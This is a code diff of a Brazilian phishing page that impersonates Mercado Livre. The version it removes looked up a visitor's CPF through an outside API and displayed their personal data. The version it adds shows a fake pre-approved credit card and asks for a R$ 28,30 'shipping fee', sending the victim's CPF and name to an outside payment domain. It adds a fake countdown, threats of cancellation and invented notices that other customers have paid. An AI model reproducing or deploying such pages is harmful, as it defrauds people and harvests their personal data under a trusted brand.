@@ -7,286 +7,471 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/all.min.css">
-  <title>Cartão</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
-      color: #333;
-    }
-    .header {
-      display: flex;
-      align-items: center;
-      padding: 10px;
-      border-bottom: 1px solid #aa9900;
-      background-color: #FFE600;
-    }
-    .header img {
-      width: 125px;
-      padding: 10px;
-    }
-    .logo {
-      margin-left: 20px;
-    }
-    .content {
-      margin: 0 auto;
-      padding: 10px 20px 30px 20px;
-      margin: 0px 15px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      background-color: #ffffff;
-      margin-top: 20px;
-    }
-    h1 {
-      font-family: 'Sora', sans-serif;
-      color: #333;
-      font-size: 16px;
-      margin-bottom: 20px;
-    }
-    .cpf-input {
-      width: 100%;
-      padding: 15px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      margin-bottom: 20px;
-      box-sizing: border-box;
-    }
-    .button, .button2 {
-      background-color: #FFE600;
-      color: #1c1c1c;
-      padding: 15px 30px;
-      border-radius: 10px;
-      font-family: 'Sora', sans-serif;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-      width: 100%;
-      text-decoration: none;
-      display: inline-block;
-      text-align: center;
-      box-sizing: border-box;
-      border: none;
-    }
-    .button:hover {
-      background-color: #e6cf00;
-    }
-    label {
-      font-family: 'Sora', sans-serif;
-      color: #666;
-      font-size: 16px;
-      display: block;
-      margin-bottom: 10px;
-    }
-    .notification-card {
-      background-color: #ffeded;
-      border: 1px solid #ff5252;
-      color: #ff5252;
-      padding: 15px 20px;
-      border-radius: 8px;
-      font-family: 'Sora', sans-serif;
-      display: flex;
-      align-items: center;
-      margin-bottom: 20px;
-      display: none;
-    }
-    .notification-card i {
-      margin-right: 10px;
-      font-size: 18px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <title>Cartão Virtual</title>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #e6b800;
+            background-color: #FFE600;
+        }
+
+        .logo {
+            width: 125px;
+            padding: 10px;
+            margin-left: 20px;
+        }
+
+        .content {
+            flex: 1;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .limite-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .limite-valor {
+            text-align: center;
+            font-size: 36px;
+            font-weight: bold;
+            color: #ffbf00;
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: linear-gradient(45deg, #e6b800, #fff159);
+            border-radius: 15px;
+            padding: 20px;
+            height: 165px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        .card-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 14px;
+            color: white;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+        }
+
+        .footer p {
+            font-family: 'Sora', sans-serif;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .button {
+            background: #FFE600;
+            color: black;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background: #e6b800;
+        }
+    </style>
 </head>
 <body>
-  <div class="header">
-    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
-  </div>
-
-  <div class="content">
-    <div id="primeiraParte">
-      <h1>Preencha seus dados para cadastro</h1>
-
-      <label for="cpf">CPF</label>
-      <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">
-
-      <div id="notification" class="notification-card">
-        <i class="fas fa-exclamation-circle"></i>
-        <span id="notification-message"></span>
-      </div>
-
-      <button class="button2" id="consultarBtn">Continuar</button>
+    <div class="header">
+        <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
     </div>
 
-    <div id="resultadoModal" style="display: none;">
-      <div style="text-align: center; margin-bottom: 20px; margin-top: 20px;">
-        <svg width="40" height="40" viewBox="0 0 40 40">
-          <circle cx="20" cy="20" r="19" fill="#4CAF50" stroke="#45a049" stroke-width="2"></circle>
-          <path d="M12 20l6 6 12-12" stroke="white" stroke-width="3" fill="none"></path>
-        </svg>
-        <h3 style="color: #4CAF50; margin: 10px 0;">Dados encontrados com sucesso!</h3>
-      </div>
+    <div class="content">
+        <div class="limite-text">Seu Limite Disponível</div>
+        <div class="limite-valor">R$ 4.700</div>
 
-      <div id="dadosContainer" style="font-family: 'Sora', sans-serif;">
-        <div style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center;">
-          <i class="fas fa-user" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
-          <div>
-            <div style="color: #666; font-size: 13px;">Nome completo</div>
-            <div id="nomeResult" style="color: #333; font-size: 15px; font-weight: 600;"></div>
-          </div>
+        <div class="card" style="background: linear-gradient(135deg, #efa000, #FFE600); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
+            <!-- Efeito de brilho no cartão -->
+            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+            <style>
+                @keyframes shine {
+                    0% { left: -100%; }
+                    20% { left: 100%; }
+                    100% { left: 100%; }
+                }
+            </style>
+            
+            <!-- Faixa magnética -->
+            <div style="position: absolute; top: 20px; left: 0; width: 100%; height: 50px; background-color: #5a5a5a; z-index: 2;"></div>
+
+            <!-- Número do cartão -->
+            <div style="position: absolute; top: 47.5%; left: 20px; transform: translateY(-50%);">
+                <div style="color: rgb(255, 255, 255); font-size: 24px; letter-spacing: 4px; font-family: 'Sora', sans-serif; text-shadow: 0 2px 4px rgba(0,0,0,0.2);">
+                    4532 •••• •••• ••••
+                </div>
+            </div>
+
+            <!-- Área de assinatura e validade -->
+            <div style="position: absolute; top: 125px; left: 0; width: 100%; display: flex; justify-content: space-between; z-index: 2; padding: 0 20px; box-sizing: border-box;">
+                <div style="display: flex; flex-direction: column;">
+                    <span style="color: white; font-size: 10px; margin-bottom: 5px; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">VALIDADE</span>
+                    <span style="color: white; font-size: 14px; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">12/28</span>
+                </div>
+            </div>
+            <div style="position: absolute; top: 125px; right: 20px; padding-right: 5px; width: calc(100% - 120px); height: 40px; background-color: rgba(255,255,255,0.9); border-radius: 4px; z-index: 2; display: flex; align-items: center;">
+                <div style="width: 80%; height: 20px; margin-left: 10px; background-image: repeating-linear-gradient(45deg, #ccc, #ccc 5px, #eee 5px, #eee 10px);"></div>
+                <div style="width: 50px; height: 30px; margin-left: 5px;  background-color: white; border-radius: 3px; display: flex; justify-content: center; align-items: center;">
+                    <span style="color: #333; font-size: 14px; font-weight: bold;">719</span>
+                </div>
+            </div>
+            
+            <!-- Logo Sicredi no canto inferior direito -->
+            <div style="position: absolute; bottom: 10px; right: 20px; z-index: 2;">
+                <img src="images/logo.png" alt="Logo Sicredi" style="width: 60px;">
+            </div>
+
+            <!-- Padrão de segurança no fundo do cartão -->
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+            
+            <script>
+                const cardColor = JSON.parse(localStorage.getItem('cardColor'));
+                if (cardColor) {
+                    document.querySelector('.card').style.background = `linear-gradient(45deg, ${cardColor.color1}, ${cardColor.color2})`;
+                }
+            </script>
         </div>
 
-        <div id="maeContainer" style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center;">
-          <i class="fas fa-female" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
-          <div>
-            <div style="color: #666; font-size: 13px;">Nome da mãe</div>
-            <div id="maeResult" style="color: #333; font-size: 15px; font-weight: 600;"></div>
-          </div>
-        </div>
+        <div style="text-align: center; margin-top: 30px;">
+            <h2 style="font-size: 18px; margin-bottom: 5px;">Finalize o envio do seu cartão</h2>
+            <p style="color: #666; font-size: 14px; margin-bottom: 25px;">
+                Pague o frete para receber o cartão físico, ativar o cartão virtual agora mesmo e receber o seu brinde!
+            </p>
 
-        <div style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center;">
-          <i class="fas fa-venus-mars" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
-          <div>
-            <div style="color: #666; font-size: 13px;">Sexo</div>
-            <div id="sexoResult" style="color: #333; font-size: 15px; font-weight: 600;"></div>
-          </div>
-        </div>
+            <div style="text-align: center; font-size: 28px; font-weight: bold; color: #ffbf00;">
+                    R$ 28,30
+            </div>
 
-        <div style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center;">
-          <i class="fas fa-calendar" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
-          <div>
-            <div style="color: #666; font-size: 13px;">Data de nascimento</div>
-            <div id="nascimentoResult" style="color: #333; font-size: 15px; font-weight: 600;"></div>
-          </div>
-        </div>
-      </div>
+            <button onclick="this.innerHTML = '<i class=\'fas fa-spinner fa-spin\' style=\'margin-right: 10px;\'></i>Encaminhando para pagamento'; window.location.href = buildFinalUrl('https://pay.xpagueseguro.online/mwK436dlOpMGQ8b')" class="button">
+                    Pagar Frete
+            </button>
 
-      <button class="button" onclick="window.location.href = buildUrlWithParams('../6/index.html')">
-        Continuar
-      </button>
+            <div style="text-align: center; margin-top: 15px;">
+                    <i class="fas fa-lock" style="font-size: 20px; color: #28a745; vertical-align: middle;"></i>
+                    <span style="color: #28a745; font-size: 14px; margin-left: 5px;">Pagamento 100% seguro</span>
+            </div>
+
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: left; margin-top: 20px;">
+                <div style="margin-bottom: 15px;">
+                    <div style="font-weight: bold; margin-bottom: 5px;">Método de Envio</div>
+                    <div>SEDEX</div>
+                </div>
+
+                <div style="margin-bottom: 15px;">
+                    <div style="font-weight: bold; margin-bottom: 5px;">Prazo de Entrega</div>
+                    <div>1 dia útil</div>
+                </div>
+
+                <div style="margin-bottom: 15px;">
+                    <div style="font-weight: bold; margin-bottom: 5px;">Pagamento em Até 10 Minutos</div>
+                    <div>Realize o pagamento do frete em até 10 minutos para ativar o cartão virtual.</div>
+                </div>
+
+                <div style="margin-bottom: 15px;">
+                    <div style="font-weight: bold; margin-bottom: 5px;">Ativação Após Pagamento</div>
+                    <div>O cartão virtual será ativado automaticamente após a aprovação do pagamento.</div>
+                </div>
+            </div>
+
+            <div style="background: #ffe6e6; border-radius: 8px; padding: 15px; margin-top: 20px; text-align: center;">
+                <i class="fas fa-clock" style="color: #dc3545; margin-right: 5px;"></i><span id="timer" style="color: #dc3545; font-weight: bold;">10:00</span><br>
+                <span style="color: #dc3545; font-size: 12px;">
+                    Essa oportunidade é válida apenas hoje! O não pagamento fará que seu cartão seja cancelado
+                </span>
+                <script>
+                    function startTimer(duration, display) {
+                        var timer = duration, minutes, seconds;
+                        var countdown = setInterval(function () {
+                            minutes = parseInt(timer / 60, 10);
+                            seconds = parseInt(timer % 60, 10);
+
+                            minutes = minutes < 10 ? "0" + minutes : minutes;
+                            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                            display.textContent = minutes + ":" + seconds;
+
+                            if (--timer < 0) {
+                                clearInterval(countdown);
+                                display.textContent = "EXPIRADO";
+                            }
+                        }, 1000);
+                    }
+
+                    window.onload = function () {
+                        var tenMinutes = 60 * 10,
+                            display = document.querySelector('#timer');
+                        startTimer(tenMinutes, display);
+                    };
+                </script>
+        </div>
+            
+        </div>
     </div>
-  </div>
 
-  <script>
-    function showNotification(message) {
-      const notification = document.getElementById('notification');
-      const notificationMessage = document.getElementById('notification-message');
-      notificationMessage.textContent = message;
-      notification.style.display = 'flex';
-      setTimeout(() => { notification.style.display = 'none'; }, 3000);
-    }
+    <div class="faq-container" style="margin: 20px auto; max-width: 600px; padding: 0 20px;">
+        <h2 style="text-align: center; color: #333; margin-bottom: 20px; font-size: 18px; border-top: 1px solid #ddd; padding-top: 50px;">Perguntas Frequentes</h2>
 
-    document.getElementById('consultarBtn').addEventListener('click', async function () {
-      const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-      const consultarBtn = document.getElementById('consultarBtn');
-      consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Realizando cadastro';
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;">
+            <div style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="toggleFaq(this)">
+                <span style="font-weight: bold; color: #333;">Como funciona o cartão virtual?</span>
+                <i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i>
+            </div>
+            <div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">
+                Você receberá dois cartões: um virtual para uso imediato em compras online com total segurança, e um físico que será entregue em sua casa. O cartão virtual é ativado assim que confirmamos o pagamento do frete, e o físico chega pelos Correios.
+            </div>
+        </div>
 
-      if (cpf.length !== 11) {
-        showNotification('Por favor, insira um CPF válido');
-        consultarBtn.innerHTML = 'Continuar';
-        return;
-      }
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;">
+            <div style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="toggleFaq(this)">
+                <span style="font-weight: bold; color: #333;">Por que eu preciso pagar o frete?</span>
+                <i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i>
+            </div>
+            <div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">
+                O pagamento do frete é obrigatório para garantir a entrega segura do seu cartão físico e a ativação imediata do seu cartão virtual. Sem ele, não é possível concluir o envio.
+            </div>
+        </div>
 
-      try {
-        const url = `https://api-production-01de.up.railway.app/?${cpf}`;
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;">
+            <div style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="toggleFaq(this)">
+                <span style="font-weight: bold; color: #333;">O que acontece depois que eu pagar o frete?</span>
+                <i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i>
+            </div>
+            <div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">
+                • Seu cartão virtual será enviado por WhatsApp • Você recebe acesso ao aplicativo com seu cartão<br>
+                • Um gerente exclusivo entra em contato via WhatsApp<br>
+                • Enviamos o código de rastreamento do cartão físico
+            </div>
+        </div>
 
-        const response = await fetch(url, {
-          headers: {
-            'content-type': `application/json`
-          }
-        });
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;">
+            <div style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="toggleFaq(this)">
+                <span style="font-weight: bold; color: #333;">E se eu pagar o frete e o cartão não chegar?</span>
+                <i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i>
+            </div>
+            <div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">
+                Garantimos a entrega do seu cartão! Caso ocorra qualquer problema, você pode solicitar o reembolso do valor do frete através do nosso SAC. Além disso, todo o processo é monitorado e você recebe atualizações por WhatsApp.
+            </div>
+        </div>
 
-        const data = await response.json();
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;">
+            <div style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="toggleFaq(this)">
+                <span style="font-weight: bold; color: #333;">E se eu não pagar o frete agora?</span>
+                <i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i>
+            </div>
+            <div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">
+                Além de não receber o cartão, você perderá o limite já aprovado e não poderá fazer outra solicitação. Essa é uma oportunidade única, então não deixe para depois!
+            </div>
+        </div>
 
-        if (response.ok) {
-          const dadosUsuario = {
-            NOME: data.NOME,
-            MAE: data.NOME_MAE || '',
-            SEXO: data.SEXO,
-            NASCIMENTO: data.NASC
-          };
+        <div style="border-bottom: 1px solid #ddd; margin-bottom: 10px;">
+            <div style="padding: 15px 0; cursor: pointer; display: flex; justify-content: space-between; align-items: center;" onclick="toggleFaq(this)">
+                <span style="font-weight: bold; color: #333;">Já paguei o frete. Preciso fazer mais alguma coisa?</span>
+                <i class="fas fa-chevron-down" style="color: #666; transition: transform 0.3s;"></i>
+            </div>
+            <div style="display: none; padding: 0 0 15px; color: #666; line-height: 1.5;">
+                Não. Após o pagamento, cuidamos de tudo. O envio do cartão é iniciado em até 2 horas, e você receberá o link com o código de rastreamento para acompanhar a entrega. É só aguardar!
+            </div>
+        </div>
 
-          localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
+        <script>
+            function toggleFaq(element) {
+                const content = element.nextElementSibling;
+                const icon = element.querySelector('.fa-chevron-down');
+                
+                if (content.style.display === "none") {
+                    content.style.display = "block";
+                    icon.style.transform = "rotate(180deg)";
+                } else {
+                    content.style.display = "none";
+                    icon.style.transform = "rotate(0deg)";
+                }
+            }
+        </script>
+    
 
-          document.getElementById('nomeResult').textContent = dadosUsuario.NOME;
-          if (dadosUsuario.MAE && dadosUsuario.MAE.trim() !== '') {
-            document.getElementById('maeResult').textContent = dadosUsuario.MAE;
-            document.getElementById('maeContainer').style.display = 'flex';
-          } else {
-            document.getElementById('maeContainer').style.display = 'none';
-          }
-          document.getElementById('sexoResult').textContent = dadosUsuario.SEXO;
-          document.getElementById('nascimentoResult').textContent = dadosUsuario.NASCIMENTO;
+    <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto;">
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+            </p>
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+            </p>
+            <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </footer>
 
-          document.getElementById('resultadoModal').style.display = 'block';
-          document.getElementById('primeiraParte').style.display = 'none';
-        } else {
-          showNotification('CPF não encontrado');
+    <style>
+        .notification {
+            position: fixed;
+            left: 20px;
+            bottom: 20px;
+            background: white;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            border-radius: 8px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 1000;
         }
-        consultarBtn.innerHTML = 'Continuar';
-      } catch (error) {
-        console.error(error);
-        showNotification('Erro ao consultar CPF. Tente novamente.');
-        consultarBtn.innerHTML = 'Continuar';
-      }
-    });
 
-    document.getElementById('cpf').addEventListener('input', function (e) {
-      let value = e.target.value.replace(/\D/g, '');
-      value = value.replace(/^(\d{3})(\d)/, '$1.$2');
-      value = value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
-      value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
-      e.target.value = value.substring(0, 14);
-    });
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
 
-    function getUrlParams() {
-      const params = {};
-      const urlParams = new URLSearchParams(window.location.search);
-      for (const [key, value] of urlParams) {
-        params[key] = value;
-      }
-      return params;
-    }
+        .notification i {
+            color: #fff159;
+            font-size: 20px;
+        }
+    </style>
 
-    function buildUrlWithParams(baseUrl) {
-      const params = getUrlParams();
-      const url = new URL(baseUrl, window.location.href);
-      Object.keys(params).forEach(key => {
-        url.searchParams.append(key, params[key]);
-      });
-      return url.toString();
-    }
+    <script>
+        // Notificações dinâmicas
+        const nomes = ["Ana", "João", "Bianca", "Leonardo", "Rui", "Gustavo", "Gil", "Lia", "Caio", "Thiago", "Theo", "Maria"];
+        const sobrenomes = ["Silva", "Lima", "Costa", "Dias", "Melo", "Santos", "Reis", "Luz", "Rocha", "Cruz", "Lopes", "Gomes"];
+        const acoes = ["recebeu o cartão hoje!", "pagou a taxa de envio!", "ativou o cartão virtual!"];
 
-    document.addEventListener('DOMContentLoaded', function () {
-      const button = document.querySelector('.button');
-      if (button) {
-        button.addEventListener('click', function (e) {
-          e.preventDefault();
-          const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-          if (cpf.length !== 11) {
-            showNotification('Por favor, insira um CPF válido');
-            return;
-          }
-          const params = getUrlParams();
-          params.document = cpf;
+        function mostrarNotificacao() {
+            const nome = nomes[Math.floor(Math.random() * nomes.length)];
+            const sobrenome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+            const acao = acoes[Math.floor(Math.random() * acoes.length)];
 
-          const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
-          if (dadosUsuario && dadosUsuario.NOME) {
-            params.name = dadosUsuario.NOME;
-          }
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.innerHTML = `
+                <i class="fas fa-bell"></i>
+                <span style="font-size: 14px;">${nome} ${sobrenome} ${acao}</span>
+            `;
 
-          const url = new URL('../6/index.html', window.location.href);
-          Object.keys(params).forEach(key => {
-            url.searchParams.append(key, params[key]);
-          });
-          window.location.href = url.toString();
+            document.body.appendChild(notification);
+
+            setTimeout(() => notification.classList.add('show'), 100);
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        setInterval(mostrarNotificacao, 5000);
+        setTimeout(mostrarNotificacao, 1000);
+    </script>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+    </script>
+
+    <script>
+        // Função única para construir URL final com todos os parâmetros
+        function buildFinalUrl(targetUrl) {
+            // Recuperar todos os parâmetros salvos
+            const allParams = JSON.parse(localStorage.getItem('urlParams') || '{}');
+            
+            // Recuperar dados do usuário
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            
+            // Criar URL final
+            const url = new URL(targetUrl, window.location.href);
+            
+            // Adicionar todos os parâmetros UTM primeiro
+            Object.keys(allParams).forEach(key => {
+                if (key !== 'document' && key !== 'name' && key !== 'telephone') {
+                    url.searchParams.append(key, allParams[key]);
+                }
+            });
+            
+            // Adicionar dados do usuário
+            if (userData.document) {
+                url.searchParams.append('document', userData.document);
+            }
+            if (userData.name) {
+                url.searchParams.append('name', userData.name);
+            }
+            if (allParams.telephone) {
+                url.searchParams.append('telephone', allParams.telephone);
+            }
+            
+            console.log('URL final construída:', url.toString());
+            return url.toString();
+        }
+        
+        // Adicionar evento de clique no botão
+        document.addEventListener('DOMContentLoaded', function() {
+            const button = document.querySelector('.button');
+            if (button) {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const finalUrl = buildFinalUrl('https://pay.xpagueseguro.online/mwK436dlOpMGQ8b');
+                    window.location.href = finalUrl;
+                });
+            }
         });
-      }
-    });
-  </script>
+    </script>
 
 
-</body></html>
+
+</div></body></html>
